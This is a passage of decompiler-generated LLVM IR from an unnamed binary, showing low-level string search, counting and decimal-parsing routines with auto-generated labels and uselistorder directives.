  br i1 %v9_14e70, label %dec_label_pc_14e7c, label %dec_label_pc_14e84

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14e6c, %dec_label_pc_14e5c, %dec_label_pc_14e4c
  %v0_14e7c = phi i32 [ %v1_14e6c, %dec_label_pc_14e6c ], [ %v1_14e5c, %dec_label_pc_14e5c ], [ %v1_14e4c, %dec_label_pc_14e4c ]
  br label %dec_label_pc_14ebc

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14e6c
  %v1_14e84 = inttoptr i32 %v1_14e28 to i8*
  %v2_14e84 = load i8, i8* %v1_14e84, align 1
  %v3_14e84 = zext i8 %v2_14e84 to i32
  %v9_14e88 = icmp eq i32 %v3_14e84, %v1_14df0
  br i1 %v9_14e88, label %dec_label_pc_14ebc, label %dec_label_pc_14e90.backedge

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14eb0
  %v1_14eb0 = add i32 %v0_14eb0, -1
  %v1_14ea4 = add i32 %v0_14ea4, -1
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i8*
  %v3_14ea4 = load i8, i8* %v2_14ea4, align 1
  %v4_14ea4 = zext i8 %v3_14ea4 to i32
  %v9_14ea8 = icmp eq i32 %v4_14ea4, %v1_14df0
  br i1 %v9_14ea8, label %dec_label_pc_14ebc, label %dec_label_pc_14eb0

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e1c, %dec_label_pc_14e90.backedge, %dec_label_pc_14ea4
  %v0_14ea4 = phi i32 [ %v1_14ea4, %dec_label_pc_14ea4 ], [ %v0_14ea413, %dec_label_pc_14e1c ], [ %v1_14e28, %dec_label_pc_14e90.backedge ]
  %v0_14eb0 = phi i32 [ %v1_14eb0, %dec_label_pc_14ea4 ], [ %v0_14e909, %dec_label_pc_14e1c ], [ %v1_14e44, %dec_label_pc_14e90.backedge ]
  %v2_14eb0 = icmp eq i32 %v0_14eb0, 0
  br i1 %v2_14eb0, label %dec_label_pc_14eb8, label %dec_label_pc_14ea4

dec_label_pc_14eb8:                               ; preds = %dec_label_pc_14eb0
  br label %dec_label_pc_14ebc

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14dfc, %dec_label_pc_14e84, %dec_label_pc_14ea4, %dec_label_pc_14e7c, %dec_label_pc_14eb8
  %v1_14ec0 = phi i32 [ %v0_14e7c, %dec_label_pc_14e7c ], [ 0, %dec_label_pc_14eb8 ], [ %v1_14ea4, %dec_label_pc_14ea4 ], [ %v1_14e28, %dec_label_pc_14e84 ], [ %v1_14dfc, %dec_label_pc_14dfc ]
  ret i32 %v1_14ec0

; uselistorder directives
  uselistorder i32 %v0_14eb0, { 1, 0 }
  uselistorder i32 %v1_14e44, { 1, 0, 2 }
  uselistorder i32 %v1_14e28, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_14e2839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14e1c, { 1, 0 }
  uselistorder i32 %v0_14e909, { 1, 2, 0 }
  uselistorder i32 %v0_14dfc, { 1, 0, 2 }
  uselistorder i32 %v2_14df4, { 1, 0 }
  uselistorder i32 %v1_14df0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ebc, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_14eb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14e90.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14e28, { 1, 0 }
  uselistorder label %dec_label_pc_14e1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14e14, { 1, 0 }
}

define i32 @function_14ecc(i8* %arg1) local_unnamed_addr {
dec_label_pc_14ecc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14efc2 = load i32, i32* @r0, align 4
  %v1_14efc3 = inttoptr i32 %v0_14efc2 to i8*
  %v2_14efc4 = load i8, i8* %v1_14efc3, align 1
  %v3_14efc5 = zext i8 %v2_14efc4 to i32
  store i32 %v3_14efc5, i32* @ip, align 4
  %v2_14f006 = icmp eq i8 %v2_14efc4, 0
  br i1 %v2_14f006, label %dec_label_pc_14f0c, label %dec_label_pc_14ee0.preheader

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14ee0
  %v3_14ee0 = zext i8 %v2_14ee0 to i32
  %v1_14ee8 = add i32 %v0_14ee8, 1
  %v9_14ed8 = icmp eq i32 %v0_14ed810, %v3_14ee0
  br i1 %v9_14ed8, label %dec_label_pc_14ef4, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14ee0.preheader, %dec_label_pc_14ed8
  %v0_14ee8 = phi i32 [ %tmp, %dec_label_pc_14ee0.preheader ], [ %v1_14ee8, %dec_label_pc_14ed8 ]
  %v1_14ee0 = inttoptr i32 %v0_14ee8 to i8*
  %v2_14ee0 = load i8, i8* %v1_14ee0, align 1
  %v2_14ee4 = icmp eq i8 %v2_14ee0, 0
  br i1 %v2_14ee4, label %dec_label_pc_14f0c, label %dec_label_pc_14ed8

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ed8
  %v1_14ef4 = add i32 %v0_14ef4, 1
  %v1_14ef8 = add i32 %v0_14ef8, 1
  %v1_14efc = inttoptr i32 %v1_14ef8 to i8*
  %v2_14efc = load i8, i8* %v1_14efc, align 1
  %v3_14efc = zext i8 %v2_14efc to i32
  store i32 %v3_14efc, i32* @ip, align 4
  %v2_14f00 = icmp eq i8 %v2_14efc, 0
  br i1 %v2_14f00, label %dec_label_pc_14f0c, label %dec_label_pc_14ee0.preheader

dec_label_pc_14ee0.preheader:                     ; preds = %dec_label_pc_14ecc, %dec_label_pc_14ef4
  %v0_14ef8 = phi i32 [ %v1_14ef8, %dec_label_pc_14ef4 ], [ %v0_14efc2, %dec_label_pc_14ecc ]
  %v0_14ef4 = phi i32 [ %v1_14ef4, %dec_label_pc_14ef4 ], [ 0, %dec_label_pc_14ecc ]
  %v0_14ed810 = phi i32 [ %v3_14efc, %dec_label_pc_14ef4 ], [ %v3_14efc5, %dec_label_pc_14ecc ]
  br label %dec_label_pc_14ee0

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14ef4, %dec_label_pc_14ee0, %dec_label_pc_14ecc
  %v0_14f0c = phi i32 [ 0, %dec_label_pc_14ecc ], [ %v0_14ef4, %dec_label_pc_14ee0 ], [ %v1_14ef4, %dec_label_pc_14ef4 ]
  ret i32 %v0_14f0c

; uselistorder directives
  uselistorder i32 %v0_14ee8, { 1, 0 }
  uselistorder label %dec_label_pc_14ee0.preheader, { 1, 0 }
}

define i32 @function_14f18(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14f18:
  store i32 %arg1, i32* @r0, align 4
  %v1_14f1c = urem i32 %arg2, 256
  store i32 %v1_14f1c, i32* @r4, align 4
  %v2_14f1c = icmp eq i32 %v1_14f1c, 0
  br i1 %v2_14f1c, label %dec_label_pc_14f30, label %dec_label_pc_14f44.preheader

dec_label_pc_14f44.preheader:                     ; preds = %dec_label_pc_14f18
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_14f4c3 = call i32 @function_15078(i32 %arg1, i32 %v1_14f1c)
  %v2_14f505 = icmp eq i32 %v2_14f4c3, 0
  br i1 %v2_14f505, label %dec_label_pc_14f58, label %dec_label_pc_14f3c

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f18
  %v2_14f34 = call i32 @function_15078(i32 %arg1, i32 0)
  br label %dec_label_pc_14f5c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f44.preheader, %dec_label_pc_14f3c
  %v2_14f4c6 = phi i32 [ %v2_14f4c, %dec_label_pc_14f3c ], [ %v2_14f4c3, %dec_label_pc_14f44.preheader ]
  store i32 %v2_14f4c6, i32* @r5, align 4
  %v1_14f40 = add i32 %v2_14f4c6, 1
  store i32 %v1_14f40, i32* @r0, align 4
  %v0_14f48 = load i32, i32* @r4, align 4
  %v2_14f4c = call i32 @function_15078(i32 %v1_14f40, i32 %v0_14f48)
  %v2_14f50 = icmp eq i32 %v2_14f4c, 0
  br i1 %v2_14f50, label %dec_label_pc_14f58, label %dec_label_pc_14f3c

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f3c, %dec_label_pc_14f44.preheader
  %v0_14f58 = load i32, i32* @r5, align 4
  br label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f30, %dec_label_pc_14f58
  %storemerge = phi i32 [ %v2_14f34, %dec_label_pc_14f30 ], [ %v0_14f58, %dec_label_pc_14f58 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_14f4c, { 1, 0 }
  uselistorder i32 %v1_14f40, { 1, 0 }
  uselistorder i32 %v1_14f1c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %dec_label_pc_14f3c, { 1, 0 }
}

define i32 @function_14f68(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14f68:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_14f68 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14f78 = call i32 @function_f700()
  %v0_14f7c = load i32, i32* @r5, align 4
  %v1_14f7c = load i32, i32* @r4, align 4
  %v2_14f7c = add i32 %v1_14f7c, %v0_14f7c
  store i32 %v6_14f68, i32* @r5, align 4
  ret i32 %v2_14f7c
}

define i32 @function_14f8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14f8c:
  %v1_14f90 = urem i32 %arg1, 256
  %v0_14fb02 = load i32, i32* @r0, align 4
  %v1_14fb03 = urem i32 %v0_14fb02, 4
  %v2_14fb04 = icmp eq i32 %v1_14fb03, 0
  br i1 %v2_14fb04, label %dec_label_pc_14fb8, label %dec_label_pc_14f98

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14f8c, %dec_label_pc_14fac
  %v0_14fac = phi i32 [ %v1_14fac, %dec_label_pc_14fac ], [ %v0_14fb02, %dec_label_pc_14f8c ]
  %v1_14f98 = inttoptr i32 %v0_14fac to i8*
  %v2_14f98 = load i8, i8* %v1_14f98, align 1
  %v3_14f98 = zext i8 %v2_14f98 to i32
  %v9_14f9c = icmp eq i32 %v3_14f98, %v1_14f90
  br i1 %v9_14f9c, label %dec_label_pc_15068, label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14f98
  %v2_14fa4 = icmp eq i8 %v2_14f98, 0
  br i1 %v2_14fa4, label %dec_label_pc_15068, label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14fa4
  %v1_14fac = add i32 %v0_14fac, 1
  %v1_14fb0 = urem i32 %v1_14fac, 4
  %v2_14fb0 = icmp eq i32 %v1_14fb0, 0
  br i1 %v2_14fb0, label %dec_label_pc_14fb8, label %dec_label_pc_14f98

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14fac, %dec_label_pc_14f8c
  %v0_14fbc = phi i32 [ %v0_14fb02, %dec_label_pc_14f8c ], [ %v1_14fac, %dec_label_pc_14fac ]
  %v4_14fb8 = mul nuw nsw i32 %v1_14f90, 256
  %v5_14fb8 = or i32 %v4_14fb8, %v1_14f90
  %v4_14fc0 = mul i32 %v5_14fb8, 65536
  %v5_14fc0 = or i32 %v4_14fc0, %v5_14fb8
  br label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_15060, %dec_label_pc_15000, %dec_label_pc_14fb8
  %v0_15028 = phi i32 [ %v0_14fbc, %dec_label_pc_14fb8 ], [ %v4_14fc4, %dec_label_pc_15000 ], [ %v4_14fc4, %dec_label_pc_15060 ]
  %v1_14fc4 = inttoptr i32 %v0_15028 to i32*
  %v2_14fc4 = load i32, i32* %v1_14fc4, align 4
  %v4_14fc4 = add i32 %v0_15028, 4
  %v2_14fcc = xor i32 %v2_14fc4, %v5_14fc0
  %v2_14fd0 = add i32 %v2_14fcc, 2130640639
  store i32 %v2_14fd0, i32* @ip, align 4
  %v2_14fd8 = add i32 %v2_14fc4, 2130640639
  %v1_14fdc = sub i32 -1, %v2_14fc4
  %v2_14fe0 = xor i32 %v2_14fd8, %v1_14fdc
  %v2_14fec = and i32 %v2_14fe0, -2130640640
  %v2_14ff4 = icmp eq i32 %v2_14fec, 0
  br i1 %v2_14ff4, label %dec_label_pc_15000, label %dec_label_pc_15008

dec_label_pc_15000:                               ; preds = %dec_label_pc_14fc4
  %v1_14fe8 = sub i32 -1, %v2_14fcc
  %v2_14ff0 = xor i32 %v2_14fd0, %v1_14fe8
  %v2_14ff8 = and i32 %v2_14ff0, -2130640640
  %v2_15000 = icmp eq i32 %v2_14ff8, 0
  br i1 %v2_15000, label %dec_label_pc_14fc4, label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %dec_label_pc_14fc4, %dec_label_pc_15000
  %v2_15008 = inttoptr i32 %v0_15028 to i8*
  %v3_15008 = load i8, i8* %v2_15008, align 1
  %v4_15008 = zext i8 %v3_15008 to i32
  %v9_1500c = icmp eq i32 %v4_15008, %v1_14f90
  br i1 %v9_1500c, label %dec_label_pc_15068, label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_15008
  %v2_15018 = icmp eq i8 %v3_15008, 0
  br i1 %v2_15018, label %dec_label_pc_15068, label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_15018
  %v1_15020 = add i32 %v0_15028, 1
  %v2_15020 = inttoptr i32 %v1_15020 to i8*
  %v3_15020 = load i8, i8* %v2_15020, align 1
  %v4_15020 = zext i8 %v3_15020 to i32
  %v9_15024 = icmp eq i32 %v4_15020, %v1_14f90
  br i1 %v9_15024, label %dec_label_pc_15068, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15020
  %v2_15030 = icmp eq i8 %v3_15020, 0
  br i1 %v2_15030, label %dec_label_pc_15068, label %dec_label_pc_15038

dec_label_pc_15038:                               ; preds = %dec_label_pc_15030
  %v1_15038 = add i32 %v0_15028, 2
  %v2_15038 = inttoptr i32 %v1_15038 to i8*
  %v3_15038 = load i8, i8* %v2_15038, align 1
  %v4_15038 = zext i8 %v3_15038 to i32
  %v9_1503c = icmp eq i32 %v4_15038, %v1_14f90
  br i1 %v9_1503c, label %dec_label_pc_15068, label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %dec_label_pc_15038
  %v2_15048 = icmp eq i8 %v3_15038, 0
  br i1 %v2_15048, label %dec_label_pc_15068, label %dec_label_pc_15050

dec_label_pc_15050:                               ; preds = %dec_label_pc_15048
  %v1_15050 = add i32 %v0_15028, 3
  %v2_15050 = inttoptr i32 %v1_15050 to i8*
  %v3_15050 = load i8, i8* %v2_15050, align 1
  %v4_15050 = zext i8 %v3_15050 to i32
  %v9_15054 = icmp eq i32 %v4_15050, %v1_14f90
  br i1 %v9_15054, label %dec_label_pc_15068, label %dec_label_pc_15060

dec_label_pc_15060:                               ; preds = %dec_label_pc_15050
  %v2_15060 = icmp eq i8 %v3_15050, 0
  br i1 %v2_15060, label %dec_label_pc_15068, label %dec_label_pc_14fc4

dec_label_pc_15068:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14f98, %dec_label_pc_15060, %dec_label_pc_15050, %dec_label_pc_15048, %dec_label_pc_15038, %dec_label_pc_15030, %dec_label_pc_15020, %dec_label_pc_15018, %dec_label_pc_15008
  %v1_1506c = phi i32 [ %v1_15050, %dec_label_pc_15060 ], [ %v1_15050, %dec_label_pc_15050 ], [ %v1_15038, %dec_label_pc_15048 ], [ %v1_15038, %dec_label_pc_15038 ], [ %v1_15020, %dec_label_pc_15030 ], [ %v1_15020, %dec_label_pc_15020 ], [ %v0_15028, %dec_label_pc_15018 ], [ %v0_15028, %dec_label_pc_15008 ], [ %v0_14fac, %dec_label_pc_14f98 ], [ %v0_14fac, %dec_label_pc_14fa4 ]
  ret i32 %v1_1506c

; uselistorder directives
  uselistorder i32 %v4_14fc4, { 1, 0 }
  uselistorder i32 %v2_14fc4, { 0, 2, 1 }
  uselistorder i32 %v0_15028, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_14fb8, { 1, 0 }
  uselistorder i32 %v1_14fac, { 1, 0, 2 }
  uselistorder i32 %v0_14fb02, { 2, 1, 0 }
  uselistorder i32 %v1_14f90, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15068, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15008, { 1, 0 }
  uselistorder label %dec_label_pc_14f98, { 1, 0 }
}

define i32 @function_15078(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15078:
  %v1_1507c = urem i32 %arg1, 256
  %v0_1509c3 = load i32, i32* @r0, align 4
  %v1_1509c4 = urem i32 %v0_1509c3, 4
  %v2_1509c5 = icmp eq i32 %v1_1509c4, 0
  br i1 %v2_1509c5, label %dec_label_pc_150a4, label %dec_label_pc_15084

dec_label_pc_15084:                               ; preds = %dec_label_pc_15078, %dec_label_pc_15098
  %v0_15098 = phi i32 [ %v1_15098, %dec_label_pc_15098 ], [ %v0_1509c3, %dec_label_pc_15078 ]
  %v1_15084 = inttoptr i32 %v0_15098 to i8*
  %v2_15084 = load i8, i8* %v1_15084, align 1
  %v3_15084 = zext i8 %v2_15084 to i32
  store i32 %v3_15084, i32* @r3, align 4
  %v9_15088 = icmp eq i32 %v3_15084, %v1_1507c
  br i1 %v9_15088, label %dec_label_pc_15158, label %dec_label_pc_15090

dec_label_pc_15090:                               ; preds = %dec_label_pc_15084
  %v2_15090 = icmp eq i8 %v2_15084, 0
  br i1 %v2_15090, label %dec_label_pc_15154, label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_15090
  %v1_15098 = add i32 %v0_15098, 1
  %v1_1509c = urem i32 %v1_15098, 4
  %v2_1509c = icmp eq i32 %v1_1509c, 0
  br i1 %v2_1509c, label %dec_label_pc_150a4, label %dec_label_pc_15084

dec_label_pc_150a4:                               ; preds = %dec_label_pc_15098, %dec_label_pc_15078
  %v0_150a8 = phi i32 [ %v0_1509c3, %dec_label_pc_15078 ], [ %v1_15098, %dec_label_pc_15098 ]
  %v4_150a4 = mul nuw nsw i32 %v1_1507c, 256
  %v5_150a4 = or i32 %v4_150a4, %v1_1507c
  %v4_150ac = mul i32 %v5_150a4, 65536
  %v5_150ac = or i32 %v4_150ac, %v5_150a4
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %dec_label_pc_1514c, %dec_label_pc_150ec, %dec_label_pc_150a4
  %v0_15114 = phi i32 [ %v0_150a8, %dec_label_pc_150a4 ], [ %v4_150b0, %dec_label_pc_150ec ], [ %v4_150b0, %dec_label_pc_1514c ]
  %v1_150b0 = inttoptr i32 %v0_15114 to i32*
  %v2_150b0 = load i32, i32* %v1_150b0, align 4
  %v4_150b0 = add i32 %v0_15114, 4
  %v2_150b8 = xor i32 %v2_150b0, %v5_150ac
  %v2_150bc = add i32 %v2_150b8, 2130640639
  store i32 %v2_150bc, i32* @ip, align 4
  %v2_150c4 = add i32 %v2_150b0, 2130640639
  %v1_150c8 = sub i32 -1, %v2_150b0
  %v2_150cc = xor i32 %v2_150c4, %v1_150c8
  %v2_150d8 = and i32 %v2_150cc, -2130640640
  %v2_150e0 = icmp eq i32 %v2_150d8, 0
  br i1 %v2_150e0, label %dec_label_pc_150ec, label %dec_label_pc_150f4

dec_label_pc_150ec:                               ; preds = %dec_label_pc_150b0
  %v1_150d4 = sub i32 -1, %v2_150b8
  %v2_150dc = xor i32 %v2_150bc, %v1_150d4
  %v2_150e4 = and i32 %v2_150dc, -2130640640
  %v2_150ec = icmp eq i32 %v2_150e4, 0
  br i1 %v2_150ec, label %dec_label_pc_150b0, label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150b0, %dec_label_pc_150ec
  %v2_150f4 = inttoptr i32 %v0_15114 to i8*
  %v3_150f4 = load i8, i8* %v2_150f4, align 1
  %v4_150f4 = zext i8 %v3_150f4 to i32
  store i32 %v4_150f4, i32* @r3, align 4
  %v9_150f8 = icmp eq i32 %v4_150f4, %v1_1507c
  br i1 %v9_150f8, label %dec_label_pc_15158, label %dec_label_pc_15104

dec_label_pc_15104:                               ; preds = %dec_label_pc_150f4
  %v2_15104 = icmp eq i8 %v3_150f4, 0
  br i1 %v2_15104, label %dec_label_pc_15154, label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_15104
  %v1_1510c = add i32 %v0_15114, 1
  %v2_1510c = inttoptr i32 %v1_1510c to i8*
  %v3_1510c = load i8, i8* %v2_1510c, align 1
  %v4_1510c = zext i8 %v3_1510c to i32
  store i32 %v4_1510c, i32* @r3, align 4
  %v9_15110 = icmp eq i32 %v4_1510c, %v1_1507c
  br i1 %v9_15110, label %dec_label_pc_15158, label %dec_label_pc_1511c

dec_label_pc_1511c:                               ; preds = %dec_label_pc_1510c
  %v2_1511c = icmp eq i8 %v3_1510c, 0
  br i1 %v2_1511c, label %dec_label_pc_15154, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_1511c
  %v1_15124 = add i32 %v0_15114, 2
  %v2_15124 = inttoptr i32 %v1_15124 to i8*
  %v3_15124 = load i8, i8* %v2_15124, align 1
  %v4_15124 = zext i8 %v3_15124 to i32
  store i32 %v4_15124, i32* @r3, align 4
  %v9_15128 = icmp eq i32 %v4_15124, %v1_1507c
  br i1 %v9_15128, label %dec_label_pc_15158, label %dec_label_pc_15134

dec_label_pc_15134:                               ; preds = %dec_label_pc_15124
  %v2_15134 = icmp eq i8 %v3_15124, 0
  br i1 %v2_15134, label %dec_label_pc_15154, label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15134
  %v1_1513c = add i32 %v0_15114, 3
  %v2_1513c = inttoptr i32 %v1_1513c to i8*
  %v3_1513c = load i8, i8* %v2_1513c, align 1
  %v4_1513c = zext i8 %v3_1513c to i32
  store i32 %v4_1513c, i32* @r3, align 4
  %v9_15140 = icmp eq i32 %v4_1513c, %v1_1507c
  br i1 %v9_15140, label %dec_label_pc_15158, label %dec_label_pc_1514c

dec_label_pc_1514c:                               ; preds = %dec_label_pc_1513c
  %v2_1514c = icmp eq i8 %v3_1513c, 0
  br i1 %v2_1514c, label %dec_label_pc_15154, label %dec_label_pc_150b0

dec_label_pc_15154:                               ; preds = %dec_label_pc_15090, %dec_label_pc_1514c, %dec_label_pc_15134, %dec_label_pc_1511c, %dec_label_pc_15104
  br label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %dec_label_pc_15084, %dec_label_pc_1513c, %dec_label_pc_15124, %dec_label_pc_1510c, %dec_label_pc_150f4, %dec_label_pc_15154
  %v1_1515c = phi i32 [ 0, %dec_label_pc_15154 ], [ %v1_1513c, %dec_label_pc_1513c ], [ %v1_15124, %dec_label_pc_15124 ], [ %v1_1510c, %dec_label_pc_1510c ], [ %v0_15114, %dec_label_pc_150f4 ], [ %v0_15098, %dec_label_pc_15084 ]
  ret i32 %v1_1515c

; uselistorder directives
  uselistorder i32 %v4_150b0, { 1, 0 }
  uselistorder i32 %v2_150b0, { 0, 2, 1 }
  uselistorder i32 %v0_15114, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_150a4, { 1, 0 }
  uselistorder i32 %v1_15098, { 1, 0, 2 }
  uselistorder i32 %v0_1509c3, { 2, 1, 0 }
  uselistorder i32 %v1_1507c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 2130640639, { 2, 6, 3, 7, 8, 4, 0, 9, 10, 5, 1 }
  uselistorder label %dec_label_pc_15158, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15154, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_150f4, { 1, 0 }
  uselistorder label %dec_label_pc_15084, { 1, 0 }
}

define i32 @function_15168(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15168:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15194

dec_label_pc_15170:                               ; preds = %dec_label_pc_15180
  %v3_15180 = zext i8 %v2_15180 to i32
  %v1_15188 = add i32 %v0_15188, 1
  %v1_15170 = load i32, i32* %r0.global-to-local, align 4
  %v9_15170 = icmp eq i32 %v3_15180, %v1_15170
  br i1 %v9_15170, label %dec_label_pc_15178, label %dec_label_pc_15180

dec_label_pc_15178:                               ; preds = %dec_label_pc_15170
  %v0_15178 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_15178, i32* %r0.global-to-local, align 4
  ret i32 %v0_15178

dec_label_pc_15180:                               ; preds = %dec_label_pc_15170, %dec_label_pc_15194
  %v0_15188 = phi i32 [ %v1_15188, %dec_label_pc_15170 ], [ %arg2, %dec_label_pc_15194 ]
  %v1_15180 = inttoptr i32 %v0_15188 to i8*
  %v2_15180 = load i8, i8* %v1_15180, align 1
  %v2_15184 = icmp eq i8 %v2_15180, 0
  br i1 %v2_15184, label %dec_label_pc_15190, label %dec_label_pc_15170

dec_label_pc_15190:                               ; preds = %dec_label_pc_15180
  %v0_15190 = load i32, i32* %r2.global-to-local, align 4
  %v1_15190 = add i32 %v0_15190, 1
  br label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %dec_label_pc_15168, %dec_label_pc_15190
  %storemerge = phi i32 [ %tmp, %dec_label_pc_15168 ], [ %v1_15190, %dec_label_pc_15190 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_15194 = inttoptr i32 %storemerge to i8*
  %v2_15194 = load i8, i8* %v1_15194, align 1
  %v3_15194 = zext i8 %v2_15194 to i32
  store i32 %v3_15194, i32* %r0.global-to-local, align 4
  %v2_15198 = icmp eq i8 %v2_15194, 0
  %v0_1519c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15198, i32 %v0_1519c)
  br label %dec_label_pc_15180

; uselistorder directives
  uselistorder i32 %v0_15188, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15194, { 1, 0 }
  uselistorder label %dec_label_pc_15180, { 1, 0 }
}

define i32 @function_151a8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_151a8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_151a8 = load i32, i32* @r4, align 4
  store i32 %v3_151a8, i32* %stack_var_-28, align 4
  %v0_151b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_151b0 = icmp eq i32 %v0_151b0, 0
  br i1 %v2_151b0, label %dec_label_pc_1528c, label %dec_label_pc_151c0

dec_label_pc_151c0:                               ; preds = %dec_label_pc_151a8
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151c0, %dec_label_pc_15250
  %v1_15250 = phi i32 [ 0, %dec_label_pc_151c0 ], [ %v5_15250, %dec_label_pc_15250 ]
  %v0_15254 = phi i32 [ 1, %dec_label_pc_151c0 ], [ %v1_15254, %dec_label_pc_15250 ]
  %v0_151d8 = phi i32 [ %v0_151b0, %dec_label_pc_151c0 ], [ %v0_151d812, %dec_label_pc_15250 ]
  %v1_151d8 = inttoptr i32 %v0_151d8 to i8*
  %v2_151d8 = load i8, i8* %v1_151d8, align 1
  %v3_151d8 = zext i8 %v2_151d8 to i32
  %v4_151dc = load i32, i32* inttoptr (i32 143884 to i32*), align 4
  %v2_151e0 = mul nuw nsw i32 %v3_151d8, 2
  %v2_151e4 = add i32 %v2_151e0, %v4_151dc
  %v3_151e4 = inttoptr i32 %v2_151e4 to i16*
  %v4_151e4 = load i16, i16* %v3_151e4, align 2
  %v1_151e8 = and i16 %v4_151e4, 8
  %v2_151e8 = icmp eq i16 %v1_151e8, 0
  br i1 %v2_151e8, label %dec_label_pc_1528c, label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151d8
  br label %dec_label_pc_15210

dec_label_pc_151f8:                               ; preds = %dec_label_pc_15210
  %v2_151f8 = mul i32 %v0_15250, 10
  %v1_151fc = add i32 %v2_151f8, -48
  %v2_15200 = add i32 %v3_15210, %v1_151fc
  %v8_15208 = icmp sgt i32 %v2_15200, 255
  br i1 %v8_15208, label %dec_label_pc_1528c, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151f8
  %v1_1520c = add i32 %v0_15240, 1
  store i32 %v1_1520c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15210

dec_label_pc_15210:                               ; preds = %dec_label_pc_151f0, %dec_label_pc_1520c
  %v0_15250 = phi i32 [ 0, %dec_label_pc_151f0 ], [ %v2_15200, %dec_label_pc_1520c ]
  %v0_15240 = phi i32 [ %v0_151d8, %dec_label_pc_151f0 ], [ %v1_1520c, %dec_label_pc_1520c ]
  %v1_15210 = inttoptr i32 %v0_15240 to i8*
  %v2_15210 = load i8, i8* %v1_15210, align 1
